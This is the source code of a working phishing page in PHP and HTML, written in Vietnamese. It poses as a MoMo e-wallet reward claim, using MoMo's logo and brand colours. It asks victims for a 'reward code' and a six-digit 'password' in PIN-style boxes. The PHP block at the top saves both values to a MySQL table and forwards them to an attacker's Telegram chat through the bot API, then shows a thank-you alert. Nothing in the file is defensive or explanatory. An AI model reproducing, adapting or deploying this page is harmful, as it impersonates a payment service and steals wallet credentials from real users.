<?php
// --------- Load config từ .env -----------
if (file_exists(__DIR__ . "/.env")) {
  $lines = file(__DIR__ . "/.env", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
  foreach ($lines as $line) {
    if (strpos(trim($line), "#") === 0) continue;
    list($name, $value) = explode("=", $line, 2);
    $_ENV[trim($name)] = trim($value);
  }
}

$DB_HOST = $_ENV["DB_HOST"] ?? "localhost";
$DB_USER = $_ENV["DB_USER"] ?? "root";
$DB_PASS = $_ENV["DB_PASS"] ?? "";
$DB_NAME = $_ENV["DB_NAME"] ?? "demo_zalo";

$TELEGRAM_BOT_TOKEN = $_ENV["TELEGRAM_BOT_TOKEN"] ?? "";
$TELEGRAM_CHAT_ID   = $_ENV["TELEGRAM_CHAT_ID"] ?? "";

// --------- Kết nối DB -----------
$conn = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
if ($conn->connect_error) {
  die("Kết nối DB thất bại: " . $conn->connect_error);
}

// --------- Xử lý submit -----------
if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $num1 = $_POST["num1"] ?? "";
  $num2 = $_POST["num2"] ?? "";

  if (preg_match("/^[0-9]{4,6}$/", $num1) && preg_match("/^[0-9]{6}$/", $num2)) {
    // Lưu DB
    $stmt = $conn->prepare("INSERT INTO random_input (number1, number2) VALUES (?, ?)");
    $stmt->bind_param("ss", $num1, $num2);
    $stmt->execute();
    $stmt->close();

    // Gửi Telegram
    if (!empty($TELEGRAM_BOT_TOKEN) && !empty($TELEGRAM_CHAT_ID)) {
      $msg = "🔔 Có dữ liệu mới:\nMã: $num1\nMật Khẩu: $num2";
      $url = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
      $data = [
        "chat_id" => $TELEGRAM_CHAT_ID,
        "text"    => $msg,
        "parse_mode" => "HTML"
      ];
      $options = [
        "http" => [
          "header"  => "Content-type: application/x-www-form-urlencoded\r\n",
          "method"  => "POST",
          "content" => http_build_query($data)
        ]
      ];
      $context  = stream_context_create($options);
      file_get_contents($url, false, $context);
    }

    echo "<script>alert('✨ Cảm ơn bạn đã điền thông tin ✨');</script>";
  } else {
    echo "<script>alert('❌ Dữ liệu không hợp lệ!');</script>";
  }
}
?>
<!DOCTYPE html>
<html lang="vi">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta property="og:image" content="banner.jpg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />

  <link rel="icon" type="image/png" href="MoMo_Logo.png" />
  <title>Nhận thưởng MoMo</title>
  <style>
    :root {
      --brand: #D42A97;
      --bg: #f0f4f8;
      --text: #333;
      --text-light: #666;
      --card: #fff;
      --border: #e1e5e9;
      --shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
      --green: #a00066ff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    } 

    html,
    body {
      height: 100%;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    body {
      background: url("banernew.jpg") no-repeat center center;
  background-size: cover;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 0;
    }

    /* Header với back button */
    .header {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      padding: 15px 20px;
      display: flex;
      align-items: center;
      gap: 15px;
      color: white;
      position: relative;
      z-index: 10;
    }

    .back-btn {
      background: none;
      border: none;
      color: white;
      font-size: 24px;
      cursor: pointer;
      padding: 5px;
      border-radius: 50%;
      transition: background 0.2s;
    }

    .back-btn:hover {
      background: rgba(255, 255, 255, 0.2);
    }

    .header-title {
      font-size: 18px;
      font-weight: 600;
    }

    /* Main container */
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 20px;
      max-width: 400px;
      margin: 0 auto;
      width: 100%;
    }

    /* Title section */
    .title-section {
      margin-top: 20%;
      text-align: center;
      margin-bottom: 30px;
      color: white;
    }

    .main-title {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .main-title .highlight {
      color: var(--brand);
    }

    .subtitle {
      font-size: 16px;
      opacity: 0.9;
      margin-bottom: 5px;
    }

    .phone-info {
      font-size: 14px;
      opacity: 0.8;
    }

    /* Form container */
    .form-container {
      background: white;
      border-radius: 20px;
      padding: 30px 25px;
      box-shadow: var(--shadow);
      margin-bottom: 20px;
    }

    /* Input groups */
    .form-group {
      margin-bottom: 25px;
    }

    .form-group:last-of-type {
      margin-bottom: 30px;
    }

    .input-label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 8px;
    }

    .input-field {
      width: 100%;
      padding: 15px;
      border: 2px solid var(--border);
      border-radius: 12px;
      font-size: 16px;
      transition: all 0.3s ease;
      background: #f8f9fa;
    }

    .input-field:focus {
      outline: none;
      border-color: var(--brand);
      background: white;
      box-shadow: 0 0 0 3px rgba(212, 42, 151, 0.1);
    }

    /* Password input special styling */
    .password-container {
      display: flex;
      gap: 8px;
      justify-content: space-between;
    }

    .password-digit {
      width: calc((100% - 40px) / 6);
      height: 50px;
      text-align: center;
      border: 2px solid var(--border);
      border-radius: 8px;
      font-size: 18px;
      font-weight: bold;
      background: #f8f9fa;
      transition: all 0.3s ease;
    }

    .password-digit:focus {
      outline: none;
      border-color: var(--brand);
      background: white;
      box-shadow: 0 0 0 3px rgba(212, 42, 151, 0.1);
    }

    .password-digit.filled {
      background: #e8f5e8;
      border-color: var(--green);
    }

    /* Submit button */
    .submit-btn {
      width: 100%;
      background: var(--green);
      color: white;
      border: none;
      padding: 16px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
    }

    .submit-btn:hover {
      background: #45a049;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
    }

    .submit-btn:active {
      transform: translateY(0);
    }

    /* Forgot password link */
    .forgot-link {
      text-align: center;
      margin-top: 20px;
    }

    .forgot-link a {
      color: var(--brand);
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }

    .forgot-link a:hover {
      text-decoration: underline;
    }

    /* Support chat button */
    .support-chat {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--brand);
      color: white;
      border: none;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(212, 42, 151, 0.4);
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .support-chat:hover {
      transform: scale(1.1);
    }

    .support-label {
      position: absolute;
      bottom: 70px;
      right: 0;
      background: var(--text);
      color: white;
      padding: 8px 12px;
      border-radius: 20px;
      font-size: 12px;
      white-space: nowrap;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .support-chat:hover .support-label {
      opacity: 1;
    }

    /* Error styling */
    .error {
      color: #e74c3c;
      font-size: 12px;
      margin-top: 5px;
      display: block;
      min-height: 16px;
      opacity: 0;
      transition: opacity 0.2s;
    }

    .error.show {
      opacity: 1;
    }

    .input-field.invalid,
    .password-digit.invalid {
      border-color: #e74c3c;
      background: #fdf2f2;
    }

    /* Desktop responsive */
    @media (min-width: 768px) {
      .container {
        max-width: 450px;
        padding: 40px;
      }

      .form-container {
        padding: 40px 35px;
      }

      .main-title {
        font-size: 36px;
      }

      .password-digit {
        height: 55px;
        font-size: 20px;
      }
    }

    /* Animation */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .container {
      animation: fadeInUp 0.6s ease-out;
    }

    /* Hidden input for form submission */
    .hidden-password {
      display: none;
    }
  </style>
</head>

<body>
  <!-- Header with back button
  <div class="header">
    <button class="back-btn" onclick="history.back()">←</button>
    <div class="header-title">Nhập mật khẩu</div>
  </div> -->

  <!-- Main container -->
  <div class="container">
    <!-- Title section -->
    <div class="title-section">
      <h1 class="main-title">
        <span class="highlight">Thông tin</span> <span style="color: black;">nhận thưởng</span>
      </h1>
    </div>

    <!-- Form container -->
    <div class="form-container">
      <form id="loginForm" method="POST" novalidate>
        <!-- Mã nhận thưởng -->
        <div class="form-group">
          <label class="input-label">Nhập mã nhận thưởng</label>
          <input type="tel" id="num1" name="num1" class="input-field" inputmode="numeric" pattern="[0-9]*" placeholder="Nhập 4-6 chữ số" required>
          <small class="error" id="errNum1"></small>
        </div>

        <!-- Mật khẩu với 6 ô riêng biệt -->
        <div class="form-group">
          <label class="input-label">Nhập mật khẩu</label>
          <div class="password-container">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="0">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="4">
            <input type="tel" class="password-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="5">
          </div>
          <!-- Hidden input for form submission -->
          <input type="hidden" id="num2" name="num2" required>
          <small class="error" id="errNum2"></small>
        </div>

        <!-- Submit button -->
        <button type="submit" class="submit-btn">Xác nhận</button>
      </form>

    </div>
  </div>

  <script>
    // Xử lý 6 ô nhập mật khẩu
    const passwordDigits = document.querySelectorAll('.password-digit');
    const hiddenPasswordInput = document.getElementById('num2');

    passwordDigits.forEach((input, index) => {
      input.addEventListener('input', function(e) {
        const value = e.target.value;
        
        // Chỉ cho phép số
        if (!/^[0-9]$/.test(value) && value !== '') {
          e.target.value = '';
          return;
        }

        // Cập nhật class filled
        if (value) {
          e.target.classList.add('filled');
        } else {
          e.target.classList.remove('filled');
        }

        // Tự động chuyển sang ô tiếp theo
        if (value && index < passwordDigits.length - 1) {
          passwordDigits[index + 1].focus();
        }

        // Cập nhật hidden input
        updateHiddenPassword();
      });

      input.addEventListener('keydown', function(e) {
        // Xử lý phím Backspace
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
          passwordDigits[index - 1].focus();
        }
        
        // Xử lý phím mũi tên
        if (e.key === 'ArrowLeft' && index > 0) {
          passwordDigits[index - 1].focus();
        }
        if (e.key === 'ArrowRight' && index < passwordDigits.length - 1) {
          passwordDigits[index + 1].focus();
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasteData = e.clipboardData.getData('text');
        const digits = pasteData.replace(/\D/g, '').slice(0, 6);
        
        digits.split('').forEach((digit, i) => {
          if (passwordDigits[i]) {
            passwordDigits[i].value = digit;
            passwordDigits[i].classList.add('filled');
          }
        });
        
        updateHiddenPassword();
        
        // Focus ô tiếp theo sau khi paste
        const nextIndex = Math.min(digits.length, passwordDigits.length - 1);
        passwordDigits[nextIndex].focus();
      });
    });

    function updateHiddenPassword() {
      const password = Array.from(passwordDigits).map(input => input.value).join('');
      hiddenPasswordInput.value = password;
    }

    // Xử lý submit form với validation
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      let valid = true;

      const num1 = document.getElementById("num1");
      const errNum1 = document.getElementById("errNum1");
      const errNum2 = document.getElementById("errNum2");

      // Reset lỗi
      errNum1.textContent = "";
      errNum2.textContent = "";
      errNum1.classList.remove("show");
      errNum2.classList.remove("show");
      num1.classList.remove("invalid");
      passwordDigits.forEach(digit => digit.classList.remove("invalid"));

      // Kiểm tra num1
      if (!/^[0-9]{4,6}$/.test(num1.value)) {
        errNum1.textContent = "Trường này phải là 4-6 chữ số";
        errNum1.classList.add("show");
        num1.classList.add("invalid");
        valid = false;
      }

      // Kiểm tra mật khẩu (6 chữ số)
      const password = hiddenPasswordInput.value;
      if (!/^[0-9]{6}$/.test(password)) {
        errNum2.textContent = "Mật khẩu phải là đúng 6 chữ số";
        errNum2.classList.add("show");
        passwordDigits.forEach(digit => {
          if (!digit.value) {
            digit.classList.add("invalid");
          }
        });
        valid = false;
      }

      if (!valid) {
        e.preventDefault(); // Ngăn submit
      }
    });

    // Auto-focus vào ô đầu tiên khi trang load
    document.addEventListener('DOMContentLoaded', function() {
      if (passwordDigits[0]) {
        passwordDigits[0].focus();
      }
    });
  </script>
</body>

</html>